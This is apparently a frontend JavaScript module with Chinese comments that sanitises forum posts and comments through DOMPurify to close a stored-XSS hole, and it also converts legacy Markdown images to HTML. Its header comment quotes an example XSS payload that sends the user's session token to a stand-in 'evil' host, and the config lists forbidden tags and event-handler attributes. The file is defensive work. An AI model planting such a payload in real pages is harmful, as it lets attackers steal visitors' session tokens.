import DOMPurify from 'dompurify';

/**
 * 富文本净化（第 91 批）
 * ------------------------------------------------------------------
 * 背景：**存储型 XSS**。论坛帖子正文、评论、回复都是用户自己写的内容，
 * 而 PostDetailView 直接把它们塞进 `v-html`（模板 88 / 247 / 379 行），
 * 中间只有一个 `\n → <br>` 的替换 —— 没有任何净化。于是：
 *
 *     发帖内容 = `<img src=x onerror="fetch('//evil/'+sessionStorage.auth_token)">`
 *
 * 任何打开这条帖子的人都会执行它；而本项目的 token 存在 sessionStorage 里，
 * 正好是这行脚本要读的东西。
 *
 * 项目里其实**早就有 DOMPurify**（`utils/markdown.js:58` 做 Markdown 渲染时一直在用），
 * 只是"帖子 / 评论 / 审核预览 / 新闻正文"这几条 `v-html` 链路漏了。这里补一个
 * 共用入口，避免以后再各写一份、又漏一个地方。
 *
 * 为什么不改后端：帖子正文是**富文本**，后端存的是带格式的 HTML，
 * 在服务端转义会把所有人的历史正文格式全部破坏；净化必须发生在"渲染成 DOM"这一步。
 */

/**
 * 允许的标签/属性：覆盖项目里实际用到的富文本能力
 * （段落 / 标题 / 列表 / 引用 / 代码 / 表格 / 图片 / 链接 / 简单的 div-span 排版）。
 * 不在白名单里的一律丢弃 —— 包括 `<script>`、`<iframe>`、`<img onerror=...>` 这类。
 */
const RICH_TEXT_CONFIG = {
  ALLOWED_TAGS: [
    'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
    'p', 'br', 'hr', 'pre', 'code',
    'blockquote', 'ol', 'ul', 'li', 'dl', 'dt', 'dd',
    'strong', 'b', 'em', 'i', 'u', 's', 'del', 'ins', 'mark', 'sub', 'sup', 'small',
    'a', 'img',
    'table', 'thead', 'tbody', 'tr', 'th', 'td',
    'div', 'span', 'section', 'article', 'figure', 'figcaption',
  ],
  ALLOWED_ATTR: [
    'class', 'id', 'style', 'src', 'alt', 'title', 'href', 'target', 'rel',
    'width', 'height', 'loading', 'colspan', 'rowspan', 'align',
  ],
  // 强制给外链补 rel="noopener noreferrer"，避免 target="_blank" 被反向利用
  ADD_ATTR: ['target', 'rel'],
  ALLOW_DATA_ATTR: false,
  // 内容里出现 <style>/<link> 时不保留（样式注入同样属于注入）
  FORBID_TAGS: ['style', 'link', 'meta', 'iframe', 'object', 'embed', 'form', 'input', 'button'],
  FORBID_ATTR: ['onerror', 'onload', 'onclick', 'onmouseover', 'onfocus', 'srcdoc', 'formaction'],
};

if (DOMPurify.isSupported && typeof DOMPurify.addHook === 'function') {
  DOMPurify.addHook('afterSanitizeAttributes', (node) => {
    if (node.tagName === 'A' && node.getAttribute('target')) {
      node.setAttribute('rel', 'noopener noreferrer');
    }
  });
}

/**
 * 把正文里**遗留的 Markdown 图片/链接**转成 HTML（第 163 批）
 *
 * ## 为什么需要它
 *
 * 帖子正文的口径是 **HTML**（详情页、审核预览、本文件的 sanitizeRichText 都按 HTML 渲染），
 * 但历史上插入图片有**三条路径**，其中两条插的是 Markdown：
 *   · 工具栏「上传图片」→ HTML `<img>` ✓（第 161 批修正后）
 *   · `handleImageUpload`（走 el-upload）→ `![名字](url)` ✗
 *   · `processBase64Images`（把粘贴进来的 base64 图片传上去）→ `![名字](url)` ✗
 * 于是老帖子正文里存着一批 `![…](…)`，而渲染按 HTML 走 ——
 * **那些图片在新版界面里根本显示不出来**（用户会以为图片丢了）。
 *
 * 统一口径只能管住"以后"，**存量数据必须在渲染时兼容**，所以这里做一次转换：
 * 渲染前把 Markdown 图片/链接改写成 `<img>` / `<a>`，再交给 DOMPurify 净化。
 *
 * ## 两条约束
 *
 * 1. **只认"看起来像 URL"的目标**（`http(s)://` 或 `/media/…`）——
 *    正文里写 `[见附件](稍后补)` 这种不该被当成链接改写；
 * 2. **`<pre>` / `<code>` 里不动** —— 有人在代码块里贴 markdown 语法做示例，
 *    改写它等于把示例改坏。
 */
const MARKDOWN_IMAGE = /!\[([^\]]*)\]\(((?:https?:\/\/|\/media\/)[^\s)]+)\)/g;
const MARKDOWN_LINK = /\[([^\]<]+)\]\(((?:https?:\/\/|\/media\/)[^\s)]+)\)/g;

/** 把字符串按 `<pre>/<code>` 切段，标记哪些段落要跳过转换 */
function splitProtected(html) {
  const parts = [];
  const pattern = /<(pre|code)\b[\s\S]*?<\/\1>/gi;
  let lastIndex = 0;
  let match = pattern.exec(html);
  while (match) {
    if (match.index > lastIndex) parts.push({ text: html.slice(lastIndex, match.index), protect: false });
    parts.push({ text: match[0], protect: true });
    lastIndex = match.index + match[0].length;
    match = pattern.exec(html);
  }
  if (lastIndex < html.length) parts.push({ text: html.slice(lastIndex), protect: false });
  return parts;
}

/** 导出给单测：把一段 HTML 里的 Markdown 图片/链接改写成 HTML */
export function normalizeLegacyMarkdown(html) {
  if (typeof html !== 'string' || html === '') return '';
  if (!html.includes('](')) return html;   // 快速短路：没有 markdown 链接语法

  return splitProtected(html)
    .map((part) => {
      if (part.protect) return part.text;
      return part.text
        // 先处理图片：`![alt](url)`
        .replace(MARKDOWN_IMAGE, (_all, alt, url) => {
          const safeAlt = String(alt || '').replace(/"/g, '&quot;');
          return `<img src="${url}" alt="${safeAlt}" />`;
        })
        // 再处理链接：`[文字](url)`（此时图片已变成 <img>，不会被误伤）
        .replace(MARKDOWN_LINK, (_all, text, url) => `<a href="${url}">${text}</a>`);
    })
    .join('');
}

/**
 * 净化一段富文本 HTML，供 `v-html` 使用。
 *
 * 第 163 批起：**先**把遗留的 Markdown 图片/链接改写成 HTML，**再**净化。
 * 这样"老帖子里用 markdown 插的图"与"新帖子里的 <img>"在界面上表现一致，
 * 而且转换结果同样要过一遍白名单（不会因为转换绕过 XSS 防护）。
 *
 * @param {unknown} html 原始 HTML（非字符串或空值时返回 ''，不会渲染出 "null" 字样）
 * @returns {string} 净化后的 HTML
 */
export function sanitizeRichText(html) {
  if (typeof html !== 'string' || html === '') return '';
  return DOMPurify.sanitize(normalizeLegacyMarkdown(html), RICH_TEXT_CONFIG);
}

export default sanitizeRichText;
